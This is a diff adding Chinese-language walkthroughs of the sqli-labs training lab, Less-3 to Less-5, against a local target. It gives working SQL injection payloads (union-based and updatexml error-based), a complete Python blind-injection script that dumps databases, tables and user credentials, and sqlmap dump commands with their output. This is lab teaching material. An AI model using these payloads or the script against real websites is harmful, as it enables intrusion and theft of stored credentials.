@@ -2377,9 +2377,9 @@ else:
 
 输入`?id=1'`可以看到信息：
 
-> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''-1'' LIMIT 0,1' at line 1
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
 
-`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能正常显示回显。
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。
 
 输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`都能照常看到两行回显内容，说明这是字符型SQL注入。
 
@@ -2462,9 +2462,9 @@ MySQL自带四个库，其中`information_schema`库下存放着数据库对象�
 
 输入`?id=1'`可以看到信息：
 
-> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''-1'' LIMIT 0,1' at line 1
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
 
-`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能正常显示回显。
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。
 
 输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`显示的结果都依旧是报错信息，说明这不是字符型注入，而是整数型SQL注入。
 
@@ -2536,3 +2536,535 @@ MySQL自带四个库，其中`information_schema`库下存放着数据库对象�
 
 ------
 
+### Less-3
+
+本题小标题：**GET - Error based - Single quotes with twist - String**。
+
+进入靶机后可以看到信息：
+
+> Please input the ID as parameter with numeric value
+
+1.**判断是否存在SQL注入点**
+
+输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。
+
+输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。
+
+2.**判断闭合字符，注释后面的内容**
+
+输入`?id=1'`可以看到信息，说明闭合方式存在问题，正确的闭合字符是`') ` 。
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能正常显示回显。
+
+输入`?id=1')--+` 或 `?id=1')--%20` 或 `?id=1')%23`可以看到正常回显，说明这是字符型SQL注入，且闭合字符为`')`。
+
+3.**使用`order by`排序语句判断有几列数据**
+
+先随便写个数字来猜测有几行数据，输入`?id=1') order by 6--+`看到以下信息，说明列数是小于6的。
+
+> Unknown column '6' in 'order clause'
+
+再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。
+
+4.**使用`union`联合查询语句判断显示位**
+
+先使`union`前面的内容为假，比如`?id=-1') union`，这样就只会显示`union`后面的内容查询结果。
+
+因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1') union select 1,2,3--+`可以看到回显结果如下，只显示第`2`和第`3`列的数据。
+
+> Your Login name:2
+> Your Password:3
+
+5.**爆破数据库**
+
+查询所有数据库：
+
+```sql
+?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+```
+
+> Your Login name:2
+> Your Password:challenges,ctftraining,information_schema,mysql,performance_schema,security,test
+
+查询当前数据库：
+
+```sql
+?id=-1') union select 1,2,database()--+
+```
+
+> Your Login name:2
+> Your Password:security
+
+查询指定数据库中的数据表信息：
+
+```sql
+?id=-1') union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security'--+
+```
+
+> Your Login name:security
+> Your Password:emails,referers,uagents,users
+
+查询指定数据表中的数据列信息：
+
+```sql
+?id=-1') union select 1,database(), group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'--+
+```
+
+> Your Login name:security
+> Your Password:id,username,password
+
+查询指定数据表中的数据字段信息：
+
+```sql
+?id=-1') union select 1,group_concat(username),group_concat(password) from security.users--+
+```
+
+> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+
+------
+
+### Less-4
+
+本题小标题：**GET - Error based - Double quotes - String**。
+
+进入靶机后可以看到信息：
+
+> Please input the ID as parameter with numeric value
+
+1.**判断是否存在SQL注入点**
+
+输入`?id=1`可以看到有两行回显，分别是`Your Login name`和`Your Password`。
+
+输入`?id=1 and 1=1`依旧可以看到一样的两行回显，我们通过布尔条件测试说明存在注入点。
+
+2.**判断闭合字符，注释后面的内容**
+
+输入`?id=1'`居然可以看到正常回显，输入`?id=1' order by 5--+`也能看到，这就说明不对劲啦。
+
+> Your Login name:Dumb
+> Your Password:Dumb
+
+根据小标题提示信息，输入`?id=1"`可以看到信息，说明存在闭合问题，正确的闭合字符是`")`。
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
+
+输入`?id=1")--+` 或 `?id=1")--%20` 或 `?id=1")%23`可以看到正常回显，说明这是字符型SQL注入，且闭合字符为`")`。
+
+3.**使用`order by`排序语句判断有几列数据**
+
+先随便写个数字来猜测有几行数据，输入`?id=1") order by 6--+`看到以下信息，说明列数是小于6的。
+
+> Unknown column '6' in 'order clause'
+
+再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显内容正常，说明列数为3。
+
+4.**使用`union`联合查询语句判断显示位**
+
+先使`union`前面的内容为假，比如`?id=-1") union`，这样就只会显示`union`后面的内容查询结果。
+
+因为`union`前后查询的字段数量一样，所以后面的`select`需要输入三个字段，输入`?id=-1") union select 1,2,3--+`可以看到回显结果如下，只显示第`2`和第`3`列的数据。
+
+> Your Login name:2
+> Your Password:3
+
+5.**爆破数据库**
+
+查询所有数据库：
+
+```sql
+?id=-1") union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+```
+
+> Your Login name:2
+> Your Password:challenges,ctftraining,information_schema,mysql,performance_schema,security,test
+
+查询当前数据库：
+
+```sql
+?id=-1") union select 1,2,database()--+
+```
+
+> Your Login name:2
+> Your Password:security
+
+查询指定数据库中的数据表信息：
+
+```sql
+?id=-1") union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+
+```
+
+> Your Login name:security
+> Your Password:emails,referers,uagents,users
+
+查询指定数据表中的数据列信息：
+
+```sql
+?id=-1") union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'--+
+```
+
+> Your Login name:security
+> Your Password:id,username,password
+
+查询指定数据表中的数据字段信息：
+
+```sql
+?id=-1") union select 1,group_concat(username),group_concat(password) from security.users--+
+```
+
+> Your Login name:Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4
+> Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
+
+------
+
+### Less-5
+
+本题小标题：**GET - Double lnjection - Single quotes - String**。
+
+进入靶机后可以看到信息：
+
+> Please input the ID as parameter with numeric value
+
+1.**判断是否存在SQL注入点**
+
+输入`?id=1`可以看到信息：
+
+> You are in...........
+
+输入`?id=1 and 1=1`依旧可以看到一样的回显，我们通过布尔条件测试说明存在注入点。
+
+2.**判断闭合字符，注释后面的内容**
+
+输入`?id=1'`可以看到信息：
+
+> You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+
+`SQL`中采用`--`和`#`表示注释，可以使其后语句不会被执行。而**在GET请求传参注入时需要使用`--+`，`--%20`，`%23`来表示注释**，才能看到正常回显。
+
+输入`?id=1'--+` 或 `?id=1'--%20` 或 `?id=1'%23`都能照常看到You are in...........，推测这是字符型SQL注入。
+
+3.**使用`order by`排序语句判断有几列数据**
+
+先随便写个数字来猜测有几行数据，输入`?id=1' order by 6--+`看到以下信息，说明列数是小于6的。
+
+> Unknown column '6' in 'order clause'
+
+再依次尝试`5`，`4`，`3`，发现`5`和`4`的回显结果与上述信息相似，而`3`的回显是You are in...........，说明列数为3。
+
+4.**使用`union`联合查询语句判断显示位**
+
+输入`?id=-1' union select 1,2,3--+`可以看到回显结果依旧是You are in...........。
+
+由于我们在判断数据有几列的过程中看见了报错信息，因此可以尝试SQL报错注入。
+
+5.**SQL报错注入**
+
+某些网站为了方便开发者调试会开启调试信息，只要此时触发SQL语句的错误就能在页面上看到SQL语句执行后的报错信息，这种攻击方式被称为报错注入。
+
+`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。例如可以利用`database()`回显当前连接的数据库。
+
+```sql
+?id=1' and updatexml(1,concat(0x7e,(database()),0x7e),1)--+
+```
+
+> XPATH syntax error: '~security~'
+
+知道数据库名是`security`后，继续利用报错注入得到数据表名。
+
+```sql
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+
+```
+
+> XPATH syntax error: '~emails,referers,uagents,users~'
+
+继续爆破得到数据列名信息。
+
+```sql
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),0x7e),1)--+
+```
+
+> XPATH syntax error: '~id,username,password~'
+
+最后爆破指定数据字段信息，可以看到显示并不完全。
+
+```sql
+?id=1' and updatexml(1,concat(0x7e,(select group_concat(username) from security.users),0x7e),1)--+
+```
+
+> XPATH syntax error: '~Dumb,Angelina,Dummy,secure,stup'
+
+利用`Python`脚本来获取数据。
+
+```python
+# -*- coding:utf-8 -*-
+import requests
+import typing
+
+def ascii_str():  # 生成库名表名字符所在的字符列表字典
+    str_list = []
+    for i in range(33, 127):  # 所有可显示字符
+        str_list.append(chr(i))
+    # print('可显示字符：%s'%str_list)
+    return str_list  # 返回字符列表
+
+
+def db_length(url, str):
+    print("[-]开始测试数据库名长度.......")
+    num = 1
+    while True:
+        db_payload = url + "' and (length(database())=%d)--+" % num
+        r = requests.get(db_payload)
+        if str in r.text:
+            db_length = num
+            print("[+]数据库长度：%d\n" % db_length)
+            db_name(db_length)  # 进行下一步，测试库名
+            break
+        else:
+            num += 1
+
+
+def db_name(db_length):
+    print("[-]开始测试数据库名.......")
+    db_name = ''
+    str_list = ascii_str()
+    for i in range(1, db_length + 1):
+        for j in str_list:
+            db_payload = url + "' and (ord(mid(database(),%d,1))='%s')--+" % (i, ord(j))
+            r = requests.get(db_payload)
+            if str in r.text:
+                db_name += j
+                break
+    print("[+]数据库名：%s\n" % db_name)
+    tb_piece(db_name)  # 进行下一步，测试security数据库有几张表
+    return db_name
+
+
+def tb_piece(db_name):
+    print("开始测试%s数据库有几张表........" % db_name)
+    for i in range(100):  # 猜解库中有多少张表，合理范围即可
+        tb_payload = url + "' and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+" % (i, db_name)
+        r = requests.get(tb_payload)
+        if str in r.text:
+            tb_piece = i
+            break
+    print("[+]%s库一共有%d张表\n" % (db_name, tb_piece))
+    tb_name(db_name, tb_piece)  # 进行下一步，猜解表名
+
+
+def tb_name(db_name, tb_piece):
+    print("[-]开始猜解表名.......")
+    table_list = []
+    for i in range(tb_piece):
+        str_list = ascii_str()
+        tb_length = 0
+        tb_name = ''
+        for j in range(1, 20):  # 表名长度，合理范围即可
+            tb_payload = url + "' and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+" % (i, j)
+            r = requests.get(tb_payload)
+            if str in r.text:
+                tb_length = j
+                print("第%d张表名长度：%s" % (i + 1, tb_length))
+                for k in range(1, tb_length + 1):  # 根据表名长度进行截取对比
+                    for l in str_list:
+                        tb_payload = url + "' and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+" % (i, k, ord(l))
+                        r = requests.get(tb_payload)
+                        if str in r.text:
+                            tb_name += l
+                print("[+]：%s" % tb_name)
+                table_list.append(tb_name)
+                break
+    print("\n[+]%s库下的%s张表：%s\n" % (db_name, tb_piece, table_list))
+    column_num(table_list, db_name)  # 进行下一步，猜解每张表的字段数
+
+
+def column_num(table_list, db_name):
+    print("[-]开始猜解每张表的字段数：.......")
+    column_num_list = []
+    for i in table_list:
+        for j in range(30):  # 每张表的字段数量，合理范围即可
+            column_payload = url + "' and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+" % (j, i)
+            r = requests.get(column_payload)
+            if str in r.text:
+                column_num = j
+                column_num_list.append(column_num)  # 把所有表的字段，依次放入这个列表当中
+                print("[+]%s表\t%s个字段" % (i, column_num))
+                break
+    print("\n[+]表对应的字段数：%s\n" % column_num_list)
+    column_name(table_list, column_num_list, db_name)  # 进行下一步，猜解每张表的字段名
+
+
+def column_name(table_list, column_num_list, db_name):
+    global data_num
+    data_num = 0
+    print("[-]开始猜解每张表的字段名.......")
+    column_length = []
+    str_list = ascii_str()
+    column_name_list = []
+    for t in range(len(table_list)):  # t在这里代表每张表的列表索引位置
+        print("\n[+]%s表的字段：" % table_list[t])
+        for i in range(column_num_list[t]):  # i表示每张表的字段数量
+            column_name = ''
+            for j in range(1, 21):  # j表示每个字段的长度
+                column_name_length = url + "' and %d=(select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)--+" % (j - 1, table_list[t], i)
+                r = requests.get(column_name_length)
+                if str in r.text:
+                    column_length.append(j)
+                    break
+                for k in str_list:  # k表示我们猜解的字符字典
+                    column_payload = url + "' and ord(mid((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+" % (table_list[t], i, j, ord(k))
+                    r = requests.get(column_payload)
+                    if str in r.text:
+                        column_name += k
+            print('[+]：%s' % column_name)
+            column_name_list.append(column_name)
+    # print(column_name_list)#输出所有表中的字段名到一个列表中
+    dump_data(table_list, column_name_list, db_name)  # 进行最后一步，输出指定字段的数据
+def dump_data(table_list, column_name_list, db_name):
+    global data_num
+    data_num = 0
+    from typing import List
+    print("\n[-]对%s表的%s字段进行爆破.......\n" % (table_list[3], column_name_list[12:16]))
+    str_list = ascii_str()
+    for i in column_name_list[12:16]:  # id,username,password字段
+        for j in range(101):  # j表示有多少条数据，合理范围即可
+            data_num_payload = url + "' and (select count(%s) from %s.%s)=%d--+" % (i, db_name, table_list[3], j)
+            r = requests.get(data_num_payload)
+            if str in r.text:
+                data_num = j
+                break
+        print("\n[+]%s表中的%s字段有以下%s条数据：" % (table_list[3], i, data_num))
+        for k in range(data_num):
+            data_len = 0
+            dump_data = ''
+            for l in range(1, 21):  # l表示每条数据的长度，合理范围即可
+                data_len_payload = url + "' and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+" % (i, db_name, table_list[3], k, l)
+                r = requests.get(data_len_payload)
+                if str not in r.text:
+                    data_len = l - 1
+                    for x in range(1, data_len + 1):  # x表示每条数据的实际范围，作为mid截取的范围
+                        for y in str_list:
+                            data_payload = url + "' and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+" % (i, db_name, table_list[3], k, x, ord(y))
+                            r = requests.get(data_payload)
+                            if str in r.text:
+                                dump_data += y
+                                break
+                    break
+            print('[+]%s' % dump_data)  # 输出每条数据
+
+
+if __name__ == '__main__':
+    url = "http://127.0.0.1/sqli-labs-master/Less-5/?id=1"  # 目标url
+    str = "You are in"  # 布尔型盲注的true&false的判断因素
+    db_length(url, str)  # 程序入口
+```
+
+此外，还可以使用`sqlmap`进行爆破求解。
+
+查询所有数据库：
+
+```bash
+sqlmap -u "http://127.0.0.1/Less-5/?id=1" --dbs
+```
+
+可以在终端中看到以下输出：
+
+```
+available databases [7]:
+[*] challenges
+[*] ctftraining
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+[*] test
+```
+
+查询当前数据库：
+
+```bash
+sqlmap -u "http://127.0.0.1/Less-5/?id=1" --current-db
+```
+
+可以在终端中看到以下输出：
+
+```
+[INFO] fetching current database
+current database: 'security'
+```
+
+查询指定数据库中的所有表信息：
+
+```bash
+sqlmap -u "http://127.0.0.1/Less-5/?id=1" -D security --tables
+```
+
+可以在终端中看到以下输出：
+
+```
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+```
+
+查询指定数据库中指定表的所有列信息：
+
+```bash
+sqlmap -u "http://127.0.0.1/Less-5/?id=1" -D security -T users --columns
+```
+
+可以在终端中看到以下输出：
+
+```
+Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+```
+
+查询指定数据库中指定表的指定字段信息：
+
+```bash
+sqlmap -u "http://127.0.0.1/Less-5/?id=1" -D security -T users -C "username,password" --dump
+```
+
+可以在终端中看到以下输出：
+
+```
+Database: security
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| admin    | admin      |
+| admin1   | admin1     |
+| admin2   | admin2     |
+| admin3   | admin3     |
+| admin4   | admin4     |
+| secure   | crappy     |
+| Dumb     | Dumb       |
+| dhakkan  | dumbo      |
+| superman | genious    |
+| Angelina | I-kill-you |
+| batman   | mob!le     |
+| Dummy    | p@ssword   |
+| stupid   | stupidity  |
++----------+------------+
+```
+
+显然，用`sqlmap`爆破求解会更加方便。
+
+------
